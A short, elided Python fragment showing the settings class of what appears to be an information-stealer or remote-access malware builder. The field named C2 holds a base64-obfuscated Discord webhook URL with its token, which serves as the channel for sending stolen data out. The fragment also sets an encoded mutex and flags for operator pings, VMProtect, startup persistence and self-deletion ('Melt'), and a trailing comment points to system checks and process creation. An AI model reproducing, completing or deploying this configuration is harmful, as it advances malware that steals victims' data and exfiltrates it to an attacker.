...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxOTM1MjI0MzQwODg2NzM2OC91TlpLWjJUWG9RTGJ0OXlSNjZQV0lPMXFyTklNWGd0LXMtWml0UXNHTGJUX2I1cjA4MGhyR1lfanBScTNMTmgxN2VMdA==').decode())
    Mutex = base64.b64decode('ZkdXbWl5VWdTUXVyTmxRSg==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
...
# Continue with the rest of your code, for example, the system checks, process creation, etc.
